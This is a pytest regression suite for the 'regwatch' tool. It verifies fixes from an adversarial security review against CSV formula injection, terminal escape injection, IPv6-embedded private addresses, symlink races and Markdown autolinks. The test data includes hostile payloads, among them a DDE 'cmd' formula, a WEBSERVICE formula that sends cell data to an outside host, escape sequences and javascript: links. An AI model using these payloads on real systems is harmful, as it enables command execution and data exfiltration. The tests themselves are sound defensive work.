"""Regression tests for the findings of the second adversarial security review.

Each section is named after the finding it covers. Every test here fails when the
fix for its finding is removed.
"""

from __future__ import annotations

import csv
import io
import os
import re
import stat
from collections.abc import Callable
from pathlib import Path
from typing import Any

import pytest

from regwatch.cli import main
from regwatch.export import RECORD_COLUMNS, neutralise_cell, records_csv

FORMULA_CHARS = ("=", "+", "-", "@", "\t", "\r", "\n")

# --- rw-01 and rw-14: csv injection through semicolons and lookalike characters ---------


def _fields_starting_with_formula(text: str, delimiter: str) -> list[str]:
    rows = list(csv.reader(io.StringIO(text), delimiter=delimiter))
    return [cell for row in rows for cell in row if cell[:1] in FORMULA_CHARS]


def test_export_is_safe_when_a_spreadsheet_splits_on_semicolons(
    project: Path,
    edit_json: Callable[[Path, Callable[[Any], None]], None],
    tmp_path: Path,
) -> None:
    def hostile(data: Any) -> None:
        data["topics_vocabulary"] += ["safe", "=cmd|' /C calc'!A0"]
        entry = data["detail"]["nl-allergen-order"]
        entry["summary"] = "x;=1+1;y"
        entry["impacts"] = 'see note;=WEBSERVICE("https://tracker.example/?"&A2);end'
        entry["topics"] = ["safe", "=cmd|' /C calc'!A0"]

    edit_json(project.parent / "register" / "detail.json", hostile)
    out = tmp_path / "out.csv"
    assert main(["--config", str(project), "export", "--csv", str(out)]) == 0
    text = out.read_text(encoding="utf-8")
    assert "=1+1" in text
    for delimiter in (",", ";"):
        assert _fields_starting_with_formula(text, delimiter) == [], delimiter
    # The text that follows a semicolon inside a field is neutralised as well.
    [row] = [
        r for r in csv.DictReader(io.StringIO(text)) if r["obligation_id"] == "nl-allergen-order"
    ]
    assert row["summary"] == "x;'=1+1;y"
    assert row["topics"] == "safe;'=cmd|' /C calc'!A0"


def test_every_csv_field_is_quoted() -> None:
    row = {column: "plain" for column in RECORD_COLUMNS}
    text = records_csv([row])
    for line in text.splitlines():
        assert line.startswith('"') and line.endswith('"')


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        (" =1", "' =1"),
        ("\xa0=1", "'\xa0=1"),
        ("\u200b=1", "'\u200b=1"),
        ("\n=1", "'\n'=1"),
        ("\uff1d1", "'\uff1d1"),
        ("\uff0b1", "'\uff0b1"),
        ("\uff0d1", "'\uff0d1"),
        ("\uff20x", "'\uff20x"),
        ("a;=1", "a;'=1"),
        ("a,=1", "a,'=1"),
        ("a;  @x", "a;'  @x"),
        ("a\t=1", "a\t'=1"),
        ("a\n+1", "a\n'+1"),
        ("a;\u200b-1", "a;'\u200b-1"),
    ],
)
def test_neutralise_cell_covers_separators_whitespace_and_lookalikes(
    value: str, expected: str
) -> None:
    assert neutralise_cell(value) == expected


@pytest.mark.parametrize("value", ["a=b", "a;b=c", "1-2", "a, b", "x@y", "plain", ""])
def test_neutralise_cell_leaves_ordinary_text_alone(value: str) -> None:
    assert neutralise_cell(value) == value


# --- rw-02: terminal escapes through capture ---------------------------------------------

ESC = "\x1b"
HOSTILE = f"x{ESC}[2Jy\r\nz"


def test_fetch_error_cleans_its_own_message() -> None:
    from regwatch.fetch import FetchError

    message = str(FetchError(HOSTILE))
    assert message == "x [2Jy z"
    assert len(str(FetchError("a" * 5000))) <= 1000


def test_a_servers_status_line_cannot_reach_the_terminal() -> None:
    from test_fetch import make, web

    from regwatch.fetch import FetchError

    payload = f"{ESC}[2J{ESC}]0;owned\x07FAKE 200 OK\r\n\r\n".encode()
    network = web(payload)
    with pytest.raises(FetchError) as caught:
        make(network).fetch("https://example.org/")
    assert ESC not in str(caught.value)
    assert "\x07" not in str(caught.value)
    assert "\n" not in str(caught.value)


def test_capture_prints_no_escape_and_no_extra_line(
    project: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    from conftest import FakeFetcher

    from regwatch.fetch import FetchError

    class Hostile(FakeFetcher):
        def fetch(self, url: str) -> str:
            raise FetchError(HOSTILE)

    assert main(["--config", str(project), "capture"], fetcher=Hostile()) == 1
    out = capsys.readouterr().out
    assert ESC not in out
    for line in out.splitlines():
        assert line.startswith(("skipped", "captured", "regwatch capture")), line


# --- rw-03: register and catalogue values printed raw ----------------------------------

SEQUENCE = f"{ESC}]0;owned\x07{ESC}[31m\x9b2J"
TEXT_KEYS = frozenset(
    {
        "name",
        "title",
        "label",
        "definition",
        "summary",
        "impacts",
        "implications",
        "action",
        "headline",
        "what_happened",
        "theme",
        "what_triggers",
        "why",
        "note",
        "notes",
        "disclaimer",
        "kind",
        "level",
        "agency",
        "citation",
    }
)
CSV_TEXT_COLUMNS = ("citation", "title", "key_date_note", "notes")


def _poison(value: Any) -> Any:
    """Append a terminal escape sequence to every free text string in a JSON value."""
    if isinstance(value, dict):
        return {
            key: (item + SEQUENCE if key in TEXT_KEYS and isinstance(item, str) else _poison(item))
            for key, item in value.items()
        }
    if isinstance(value, list):
        return [_poison(item) for item in value]
    return value


def hostile_project(project: Path) -> Path:
    """Put a terminal escape sequence in every text field of the example project."""
    import json

    register = project.parent / "register"
    for path in register.glob("*.json"):
        data = json.loads(path.read_text(encoding="utf-8"))
        path.write_text(json.dumps(_poison(data)), encoding="utf-8")
    csv_path = register / "obligations.csv"
    rows = list(csv.DictReader(io.StringIO(csv_path.read_text(encoding="utf-8"))))
    with csv_path.open("w", newline="", encoding="utf-8") as handle:
        writer = csv.DictWriter(handle, fieldnames=list(rows[0]))
        writer.writeheader()
        for row in rows:
            for column in CSV_TEXT_COLUMNS:
                row[column] += SEQUENCE
            writer.writerow(row)
    catalogue = project.parent / "catalogue.json"
    catalogue.write_text(
        json.dumps(
            {
                "focus_areas": [
                    {
                        "focus_id": "hostile",
                        "label": f"Label{SEQUENCE}",
                        "description": f"Description{SEQUENCE}",
                        "terms": ["allergen"],
                    }
                ]
            }
        ),
        encoding="utf-8",
    )
    project.write_text(
        project.read_text(encoding="utf-8")
        + '\n[profile]\nfocus_areas = ["hostile"]\ncatalogue = "catalogue.json"\n',
        encoding="utf-8",
    )
    return project


def assert_clean(captured: pytest.CaptureResult[str]) -> None:
    for stream in (captured.out, captured.err):
        assert ESC not in stream
        assert "\x9b" not in stream
        assert "\x07" not in stream


PRINTING_COMMANDS = [
    ["list"],
    ["coverage"],
    ["portfolio"],
    ["impact"],
    ["themes"],
    ["config", "show"],
    ["check"],
    ["validate"],
]


@pytest.mark.parametrize("command", PRINTING_COMMANDS, ids=" ".join)
def test_a_register_with_escape_sequences_is_refused_without_printing_them(
    project: Path, capsys: pytest.CaptureFixture[str], command: list[str]
) -> None:
    hostile_project(project)
    code = main(["--config", str(project), *command])
    assert_clean(capsys.readouterr())
    if command[0] == "config":
        assert code == 0
    else:
        assert code == 1


def test_validation_names_the_field_with_a_control_character(
    project: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    hostile_project(project)
    assert main(["--config", str(project), "validate"]) == 1
    out = capsys.readouterr().out
    assert "contains a control character" in out
    assert "errors=" in out


@pytest.mark.parametrize("command", PRINTING_COMMANDS, ids=" ".join)
def test_console_output_is_cleaned_even_when_validation_lets_a_value_through(
    project: Path,
    capsys: pytest.CaptureFixture[str],
    monkeypatch: pytest.MonkeyPatch,
    command: list[str],
) -> None:
    hostile_project(project)
    monkeypatch.setattr("regwatch.register._validate_raw", lambda raw: [])
    main(["--config", str(project), *command])
    captured = capsys.readouterr()
    assert_clean(captured)
    if command[0] in ("list", "portfolio", "coverage"):
        assert captured.out.strip()


def test_validation_errors_do_not_echo_a_bad_value_raw(
    project: Path,
    capsys: pytest.CaptureFixture[str],
    edit_json: Callable[[Path, Callable[[Any], None]], None],
) -> None:
    def poison(data: Any) -> None:
        data["jurisdictions"][0]["jurisdiction_id"] = f"bad{SEQUENCE}"

    edit_json(project.parent / "register" / "jurisdictions.json", poison)
    assert main(["--config", str(project), "validate"]) == 1
    captured = capsys.readouterr()
    assert_clean(captured)
    assert "ERROR jurisdictions entry 1 (bad " in captured.out


def test_a_register_error_is_printed_clean(
    project: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    hostile_project(project)
    assert main(["--config", str(project), "list"]) == 1
    captured = capsys.readouterr()
    assert_clean(captured)
    assert "error: the register has" in captured.err


# --- rw-11: bidirectional controls, zero-width characters and look-alike hosts ---------------


def test_clean_text_removes_bidirectional_and_zero_width_characters() -> None:
    from regwatch.sanitize import clean_line, clean_text

    text = "a\u202eb\u2066c\u200bd\u2028e\u2029f\ufeffg"
    assert clean_text(text) == "abcd e fg"
    assert clean_line(text) == "abcd e fg"
    assert clean_line("a  b") == "a  b"


@pytest.mark.parametrize(
    "url",
    [
        "https://ex\u0430mple.gov/",
        "https://\xe9xample.gov/",
        "https://example.gov/a\u202eb",
        "https://example.gov/a\u200bb",
        "https://example.gov/a\u2028b",
    ],
)
def test_look_alike_hosts_and_invisible_characters_are_refused(url: str) -> None:
    from regwatch.sanitize import safe_https_url

    assert safe_https_url(url) == ""
    assert safe_https_url("https://xn--exmple-cua.gov/") == "https://xn--exmple-cua.gov/"


# --- rw-04: IPv6 addresses that embed an IPv4 address ---------------------------------------


@pytest.mark.parametrize(
    "address",
    [
        "64:ff9b::7f00:1",
        "64:ff9b::a9fe:a9fe",
        "::127.0.0.1",
        "::10.0.0.1",
        "fec0::1",
        "64:ff9b:1::1",
        "2002:a9fe:a9fe::1",
        "2002:7f00:1::1",
        "2001:0:4136:e378:8000:63bf:3fff:fdd2",
    ],
)
def test_ipv6_forms_that_embed_a_non_public_ipv4_address_are_refused(address: str) -> None:
    from regwatch.fetch import is_public_address

    assert is_public_address(address) is False


def test_ipv6_forms_that_embed_a_public_ipv4_address_follow_the_ipv4_rules() -> None:
    from regwatch.fetch import is_public_address

    assert is_public_address("64:ff9b::5db8:d822")
    assert is_public_address("2002:5db8:d822::1")
    assert is_public_address("2606:4700:4700::1111")


def test_a_host_that_resolves_to_an_embedded_loopback_is_never_connected_to() -> None:
    from test_fetch import make, ok, web

    from regwatch.fetch import FetchError

    for address in ("64:ff9b::a9fe:a9fe", "::127.0.0.1", "fec0::1"):
        network = web(ok(), hosts={"example.org": [address]})
        with pytest.raises(FetchError, match="non-public address"):
            make(network).fetch("https://example.org/")
        assert network.connected == []


# --- rw-13: IPv6 literal in the Host header -------------------------------------------------


def test_an_ipv6_literal_host_is_bracketed_in_the_host_header() -> None:
    from test_fetch import make, ok, web

    network = web(ok(), ok())
    make(network).fetch("https://[2606:4700::1]:8443/")
    make(network).fetch("https://[2606:4700::1]/")
    first, second = (request.decode() for request in network.requests)
    assert "Host: [2606:4700::1]:8443\r\n" in first
    assert "Host: [2606:4700::1]\r\n" in second


# --- rw-08: swap between the file root check and the open ---------------------------------


def _swap_on_open(monkeypatch: pytest.MonkeyPatch, path: Path, replace: Callable[[], None]) -> None:
    import os

    import regwatch.fetch as fetch_module

    real_open = os.open

    def swapping_open(target: Any, flags: int, *args: Any, **kwargs: Any) -> int:
        if str(target).endswith(path.name):
            replace()
        return real_open(target, flags, *args, **kwargs)

    monkeypatch.setattr(fetch_module.os, "open", swapping_open)


def test_a_file_swapped_for_a_symlink_after_the_check_is_refused(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from regwatch.fetch import FetchError, SafeFetcher

    root = tmp_path / "root"
    root.mkdir()
    secret = tmp_path / "secret.txt"
    secret.write_text("SECRET OUTSIDE THE ROOT", encoding="utf-8")
    target = root / "ok.txt"
    target.write_text("inside", encoding="utf-8")

    def replace() -> None:
        target.unlink()
        target.symlink_to(secret)

    _swap_on_open(monkeypatch, target, replace)
    fetcher = SafeFetcher(1.0, 10_000, "test", allowed_file_roots=[root])
    with pytest.raises(FetchError, match="cannot read file"):
        fetcher.fetch(target.as_uri())


def test_a_file_swapped_for_another_file_after_the_check_is_refused(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from regwatch.fetch import FetchError, SafeFetcher

    root = tmp_path / "root"
    root.mkdir()
    target = root / "ok.txt"
    target.write_text("inside", encoding="utf-8")

    def replace() -> None:
        # Create the new file while the old one still exists so the inode cannot be reused.
        other = root / "other.txt"
        other.write_text("a different file", encoding="utf-8")
        other.replace(target)

    _swap_on_open(monkeypatch, target, replace)
    fetcher = SafeFetcher(1.0, 10_000, "test", allowed_file_roots=[root])
    with pytest.raises(FetchError, match="changed while it was being opened"):
        fetcher.fetch(target.as_uri())


# --- rw-10: the total deadline covers the name lookup -----------------------------------


def test_a_slow_name_lookup_hits_the_total_deadline() -> None:
    import threading
    import time

    from test_fetch import make, ok, web

    from regwatch.fetch import FetchError

    release = threading.Event()

    class SlowDns:
        def __call__(self, host: str, port: int) -> list[str]:
            release.wait(4)
            return ["93.184.216.34"]

    network = web(ok())
    network.resolver = SlowDns()  # type: ignore[method-assign]
    started = time.monotonic()
    try:
        with pytest.raises(FetchError, match="total time limit"):
            make(network, total_timeout_seconds=1.0).fetch("https://example.org/")
        assert time.monotonic() - started < 2.0
    finally:
        release.set()
    assert network.connected == []


# --- rw-05: Markdown autolinks and horizontal rules ----------------------------------------

AUTOLINK_VALUES = [
    "Reset at https://evil.example/reset now",
    "HTTP://EVIL.EXAMPLE/A",
    "Click www.evil.example/login to confirm",
    "WWW.EVIL.EXAMPLE",
    "//evil.example/x",
    "visit evil.com/path",
    "mail security@evil.example",
    "mailto:security@evil.example",
    "ftp://files.evil.example/a",
]
RULE_VALUES = ["---", "- - -", "===", "***", "___", "* * *", "-- -", "= = ="]


@pytest.mark.parametrize("value", AUTOLINK_VALUES)
def test_escaped_text_cannot_be_autolinked(value: str) -> None:
    from regwatch.sanitize import escape_markdown

    # What is outside a code span (where nothing is linked) holds no bare address.
    outside = re.sub(r"`[^`]*`", "", escape_markdown(value))
    assert "://" not in outside.replace("\\://", "")
    assert "@" not in outside
    for word in ("www.", "evil.com", "evil.example"):
        assert word not in outside.lower().replace("\\.", "\x00")


@pytest.mark.parametrize("value", RULE_VALUES)
def test_a_value_of_only_rule_characters_is_escaped(value: str) -> None:
    from regwatch.sanitize import escape_markdown

    escaped = escape_markdown(value)
    assert escaped.replace("\\", "").strip() == value.strip()
    for char in "-=*_":
        assert char not in escaped.replace("\\" + char, "")


def test_ordinary_text_keeps_its_numbers_and_sentences() -> None:
    from regwatch.sanitize import escape_markdown

    # A dot between two digits is escaped like any dot between word characters; it still
    # renders as a dot.
    assert (
        escape_markdown("Section 101.9 applies from 2027.") == "Section 101\\.9 applies from 2027."
    )
    assert escape_markdown("a - b") == "a - b"


def test_rendered_markdown_has_no_link_and_only_the_documents_own_rule() -> None:
    markdown_it = pytest.importorskip("markdown_it")
    pytest.importorskip("linkify_it")
    from regwatch.document import Document, Section
    from regwatch.render import render_markdown

    values = [*AUTOLINK_VALUES, *RULE_VALUES, "1. ordered", "> quote"]
    doc = Document("T", "2026-10-20", sections=[Section("S", paragraphs=values, bullets=values)])
    html = markdown_it.MarkdownIt("gfm-like").render(render_markdown(doc))
    assert "<a " not in html
    assert html.count("<hr") == 1
    assert "<ol" not in html
    assert html.count("<blockquote") == 1  # the disclaimer at the end


# --- rw2-01: GitHub's renderer (cmark-gfm) must not link any value ---------------------------

GFM_VALUES = [
    "mail security@evil.example now",
    "security@evil.example",
    "Visit www.пример.рф/login to confirm",
    "Visit www.мойсайт.рф now",
    "Visit www.évil.com now",
    "Visit www.0day.co now",
    "Visit www.10.0.0.1/admin now",
    "Visit www.1.2.3.4.nip.io now",
    "www.xn--e1afmkfd.xn--p1ai",
    "WWW.EVIL.COM and wWw.Evil.Com/x",
    "www.-evil.com www./x www.",
    "(www.evil.com) *www.evil.com* _www.evil.com_ ~www.evil.com~",
    "xmpp:a@b.co/r and mailto:a@b.co",
    "tel:+15551234567 and javascript:alert(1) and data:text/html,x",
    "ftp://files.evil.example/a and https://evil.example/reset and HTTP://EVIL.EXAMPLE",
    "см. https://пример.рф/страница",
    "a`b@c.example and a``b@c.example and `@c.example`",
    "<evil@x.example> and <https://evil.example>",
    "user@例え.jp and пример@evil.example",
    "evil.example/path and evil。example",
]


@pytest.mark.parametrize("value", GFM_VALUES)
def test_github_flavoured_rendering_has_no_link(value: str) -> None:
    cmarkgfm = pytest.importorskip("cmarkgfm")
    from cmarkgfm.cmark import Options

    from regwatch.document import Document, Section
    from regwatch.render import render_markdown

    doc = Document("T", "2026-10-20", sections=[Section("S", paragraphs=[value], bullets=[value])])
    html = cmarkgfm.github_flavored_markdown_to_html(
        render_markdown(doc), options=Options.CMARK_OPT_UNSAFE
    )
    assert "<a" not in html, html


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("mail security@evil.example now", "mail `security@evil.example` now"),
        ("xmpp:a@b.co/r", "`xmpp:a@b.co/r`"),
        ("mailto:x", "`mailto:x`"),
        ("a`b@c.example", "``a`b@c.example``"),
        ("a``b@c.example", "```a``b@c.example```"),
        ("`@c.example", "`` `@c.example ``"),
        ("c.example@`", "`` c.example@` ``"),
        ("www.пример.рф/login", "www\\.пример\\.рф/login"),
        ("www.10.0.0.1/admin", "www\\.10\\.0\\.0\\.1/admin"),
        ("WWW.Evil.com www./x", "WWW\\.Evil\\.com www\\./x"),
        ("Note: nothing here.", "Note: nothing here."),
    ],
)
def test_escape_markdown_for_autolinks(value: str, expected: str) -> None:
    from regwatch.sanitize import escape_markdown

    assert escape_markdown(value) == expected


# --- rw-06: output paths written through symbolic links ----------------------------------


def test_an_output_path_that_is_a_symlink_is_refused_and_the_target_is_untouched(
    tmp_path: Path,
) -> None:
    from regwatch.state import StateError, safe_write_text

    victim = tmp_path / "victim-notes.txt"
    victim.write_text("victim's own file\n", encoding="utf-8")
    victim.chmod(0o644)
    shared = tmp_path / "shared"
    shared.mkdir()
    (shared / "report.md").symlink_to(victim)
    with pytest.raises(StateError, match="symbolic link"):
        safe_write_text(shared / "report.md", "replaced", [])
    assert victim.read_text(encoding="utf-8") == "victim's own file\n"
    assert (shared / "report.md").is_symlink()
    assert stat.S_IMODE(victim.stat().st_mode) == 0o644


def test_a_dangling_symlink_is_refused_too(tmp_path: Path) -> None:
    from regwatch.state import StateError, safe_write_text

    (tmp_path / "out.md").symlink_to(tmp_path / "missing.txt")
    with pytest.raises(StateError, match="symbolic link"):
        safe_write_text(tmp_path / "out.md", "x", [])
    assert not (tmp_path / "missing.txt").exists()


def test_the_digest_command_does_not_write_through_a_symlink(
    project: Path, tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    victim = tmp_path / "victim.txt"
    victim.write_text("keep", encoding="utf-8")
    link = tmp_path / "out" / "report.md"
    link.parent.mkdir()
    link.symlink_to(victim)
    assert main(["--config", str(project), "digest", "--out", str(link)]) == 2
    assert "symbolic link" in capsys.readouterr().err
    assert victim.read_text(encoding="utf-8") == "keep"


def test_a_symlinked_folder_above_the_file_is_still_allowed(tmp_path: Path) -> None:
    from regwatch.state import safe_write_text

    real = tmp_path / "real"
    real.mkdir()
    (tmp_path / "alias").symlink_to(real)
    safe_write_text(tmp_path / "alias" / "out.txt", "ok", [])
    assert (real / "out.txt").read_text(encoding="utf-8") == "ok"


@pytest.mark.parametrize("mode", [0o644, 0o600, 0o664])
def test_an_existing_file_keeps_its_mode(tmp_path: Path, mode: int) -> None:
    from regwatch.state import safe_write_text

    target = tmp_path / "out.txt"
    target.write_text("old", encoding="utf-8")
    target.chmod(mode)
    safe_write_text(target, "new", [])
    assert target.read_text(encoding="utf-8") == "new"
    assert stat.S_IMODE(target.stat().st_mode) == mode


@pytest.mark.parametrize("umask", [0o022, 0o002, 0o077])
def test_a_new_file_gets_the_mode_the_umask_allows(tmp_path: Path, umask: int) -> None:
    from regwatch.state import safe_write_text

    previous = os.umask(umask)
    try:
        safe_write_text(tmp_path / "new.txt", "x", [])
    finally:
        os.umask(previous)
    assert stat.S_IMODE((tmp_path / "new.txt").stat().st_mode) == 0o666 & ~umask


# --- rw-07: init checks and writes in two steps -------------------------------------------


def _plant_during_the_confirmation(
    monkeypatch: pytest.MonkeyPatch, project: Path, outside: Path
) -> None:
    from regwatch import cli

    def fake_prompt(question: str) -> str:
        if question.startswith("Create these files"):
            (project / "regwatch.toml").write_text("# my hand edited config\n", encoding="utf-8")
            (project / "register").mkdir(exist_ok=True)
            (project / "register" / "sources.json").symlink_to(outside)
            return "y"
        return ""

    monkeypatch.setattr(cli, "_prompt", fake_prompt)


def test_init_keeps_a_file_and_a_link_that_appear_while_it_asks(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    project = tmp_path / "project"
    project.mkdir()
    outside = tmp_path / "outside.json"
    outside.write_text("precious outside file\n", encoding="utf-8")
    _plant_during_the_confirmation(monkeypatch, project, outside)
    assert main(["init", "--dir", str(project)]) != 0
    capsys.readouterr()
    assert (project / "regwatch.toml").read_text(encoding="utf-8") == "# my hand edited config\n"
    assert outside.read_text(encoding="utf-8") == "precious outside file\n"


def test_init_creates_files_exclusively_even_if_the_second_check_is_skipped(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    from regwatch import cli

    project = tmp_path / "project"
    project.mkdir()
    outside = tmp_path / "outside.json"
    outside.write_text("precious outside file\n", encoding="utf-8")
    _plant_during_the_confirmation(monkeypatch, project, outside)
    real = cli._refuse_existing
    calls: list[int] = []

    def only_the_first_check(directory: Path, force: bool) -> list[str]:
        calls.append(1)
        return real(directory, force) if len(calls) == 1 else []

    monkeypatch.setattr(cli, "_refuse_existing", only_the_first_check)
    assert main(["init", "--dir", str(project)]) == 2
    assert "appeared while init was running" in capsys.readouterr().err
    assert (project / "regwatch.toml").read_text(encoding="utf-8") == "# my hand edited config\n"
    assert outside.read_text(encoding="utf-8") == "precious outside file\n"


# --- rw2-03: init writes through a directory it opened, not through a path ------------------


def _swap_register_for_a_link(project: Path, outside: Path) -> None:
    register = project / "register"
    if register.is_symlink():
        return
    if register.exists():
        register.rename(project / "register-original")
    register.symlink_to(outside)


def test_init_force_refuses_a_register_folder_swapped_for_a_link_while_it_asks(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    from regwatch import cli

    project = tmp_path / "project"
    (project / "register").mkdir(parents=True)
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "sources.json").write_text("precious outside file\n", encoding="utf-8")

    def fake_prompt(question: str) -> str:
        if question.startswith("Create these files"):
            (project / "register").rmdir()
            (project / "register").symlink_to(outside)
            return "y"
        return ""

    monkeypatch.setattr(cli, "_prompt", fake_prompt)
    assert main(["init", "--dir", str(project), "--force"]) == 2
    assert capsys.readouterr().err.startswith("error:")
    assert (outside / "sources.json").read_text(encoding="utf-8") == "precious outside file\n"
    assert sorted(p.name for p in outside.iterdir()) == ["sources.json"]


@pytest.mark.parametrize("force", [False, True])
def test_init_refuses_a_register_folder_swapped_after_the_second_check(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
    force: bool,
) -> None:
    from regwatch import cli

    project = tmp_path / "project"
    project.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "sources.json").write_text("precious outside file\n", encoding="utf-8")
    real = cli._refuse_existing
    calls: list[int] = []

    def swap_after_the_second_check(directory: Path, replace: bool) -> list[str]:
        result = real(directory, replace)
        calls.append(1)
        if len(calls) == 2:
            _swap_register_for_a_link(project, outside)
        return result

    monkeypatch.setattr(cli, "_refuse_existing", swap_after_the_second_check)
    args = ["init", "--dir", str(project), "--yes"] + (["--force"] if force else [])
    assert main(args) == 2
    assert capsys.readouterr().err.startswith("error:")
    assert (outside / "sources.json").read_text(encoding="utf-8") == "precious outside file\n"
    assert sorted(p.name for p in outside.iterdir()) == ["sources.json"]
    assert not (project / "regwatch.toml").exists()  # nothing is written once a folder is refused


@pytest.mark.parametrize("force", [False, True])
def test_init_keeps_writing_into_the_register_folder_it_opened(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, force: bool
) -> None:
    project = tmp_path / "project"
    project.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    real_open = os.open
    swapped: list[int] = []

    def racing_open(path: Any, flags: int, *args: Any, **kwargs: Any) -> int:
        first_file = str(path) == "regwatch.toml" or str(path).startswith(".regwatch-")
        if first_file and not swapped:
            swapped.append(1)
            _swap_register_for_a_link(project, outside)
        return real_open(path, flags, *args, **kwargs)

    monkeypatch.setattr("regwatch.state.os.open", racing_open)
    args = ["init", "--dir", str(project), "--yes"] + (["--force"] if force else [])
    assert main(args) == 0
    assert swapped
    assert list(outside.iterdir()) == []
    assert (project / "register-original" / "obligations.csv").is_file()
    assert (project / "register-original" / "sources.json").is_file()


# --- rw-09: the candidates file is unbounded ----------------------------------------------


def test_a_deeply_nested_candidates_file_is_a_clean_error(
    project: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    state = project.parent / "state"
    state.mkdir(exist_ok=True)
    (state / "ingest-candidates.json").write_text("[" * 100_000 + "]" * 100_000, encoding="utf-8")
    assert main(["--config", str(project), "brief"]) == 2
    err = capsys.readouterr().err
    assert err.startswith("error: cannot read ")
    assert "Traceback" not in err


def test_a_huge_candidates_file_is_refused_by_size(
    project: Path, capsys: pytest.CaptureFixture[str], monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr("regwatch.cli.MAX_STATE_BYTES", 100)
    state = project.parent / "state"
    state.mkdir(exist_ok=True)
    (state / "ingest-candidates.json").write_text(
        '{"candidates": []}' + " " * 200, encoding="utf-8"
    )
    assert main(["--config", str(project), "brief"]) == 2
    assert "is larger than 100 bytes" in capsys.readouterr().err


# --- rw-15: hand-written file roots ------------------------------------------------------


@pytest.mark.parametrize("root", ["/", "~", "~/", ".."])
def test_a_hand_written_file_root_that_is_too_broad_is_refused(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, root: str
) -> None:
    from regwatch.config import ConfigError, load_config

    home = tmp_path / "home"
    (home / "project").mkdir(parents=True)
    monkeypatch.setenv("HOME", str(home))
    config = home / "project" / "regwatch.toml"
    config.write_text(
        '[register]\nobligations = "o.csv"\njurisdictions = "j.json"\ncategories = "c.json"\n'
        'sources = "s.json"\nportfolio = "p.json"\n'
        f'[fetch]\nallowed_file_roots = ["{root}"]\n',
        encoding="utf-8",
    )
    with pytest.raises(ConfigError, match="too broad"):
        load_config(config)


def test_a_specific_file_root_is_accepted(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from regwatch.config import load_config

    home = tmp_path / "home"
    (home / "project").mkdir(parents=True)
    monkeypatch.setenv("HOME", str(home))
    config = home / "project" / "regwatch.toml"
    config.write_text(
        '[register]\nobligations = "o.csv"\njurisdictions = "j.json"\ncategories = "c.json"\n'
        'sources = "s.json"\nportfolio = "p.json"\n[fetch]\nallowed_file_roots = ["snapshots"]\n',
        encoding="utf-8",
    )
    assert load_config(config).fetch.allowed_file_roots == (home / "project" / "snapshots",)
